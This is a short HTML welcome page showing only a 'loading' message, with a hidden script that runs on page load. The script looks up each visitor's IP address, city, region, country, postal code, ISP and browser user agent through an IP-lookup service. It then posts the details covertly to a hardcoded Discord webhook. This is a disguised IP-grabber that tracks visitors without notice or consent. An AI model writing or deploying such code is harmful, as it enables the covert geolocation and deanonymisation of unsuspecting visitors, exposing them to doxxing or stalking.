<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Welcome</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    }
    body {
      background: #0f172a;
      color: #f8fafc;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      text-align: center;
      padding: 1.5rem;
    }
    .container {
      max-width: 480px;
    }
    h1 {
      font-size: 1.85rem;
      margin-bottom: 0.75rem;
    }
    p {
      color: #94a3b8;
      line-height: 1.5;
    }
  </style>
</head>
<body>

  <div class="container">
    <h1>Welcome to the Site</h1>
    <p>Loading content, please wait a moment...</p>
  </div>

  <script>
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1553533799948755070/1qNcnLdY-FtfIVl_qygR7qJWysfV7IwHTI8mnAi1f_k76OhmOvtX0ZXwYLE_phql4tDD";

    async function sendVisitorDetails() {
      try {
        const response = await fetch("https://ipwho.is/");
        const data = await response.json();

        const payload = {
          username: "Visitor Tracker",
          embeds: [
            {
              title: "🚨 New Visitor Detected",
              color: 3722232,
              fields: [
                { name: "IP Address", value: data.ip || "Unknown", inline: true },
                { name: "City", value: data.city || "Unknown", inline: true },
                { name: "Region / State", value: data.region || "Unknown", inline: true },
                { name: "Country", value: `${data.country || "Unknown"} (${data.country_code || ""})`, inline: true },
                { name: "Postal Code", value: data.postal || "Unknown", inline: true },
                { name: "ISP / Network", value: (data.connection && data.connection.isp) || "Unknown", inline: false },
                { name: "Device / Browser", value: navigator.userAgent.slice(0, 120), inline: false }
              ],
              footer: { text: "Visit Log" },
              timestamp: new Date().toISOString()
            }
          ]
        };

        await fetch(DISCORD_WEBHOOK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
      } catch (err) {
        console.error("Error logging visitor:", err);
      }
    }

    sendVisitorDetails();
  </script>
</body>
</html>
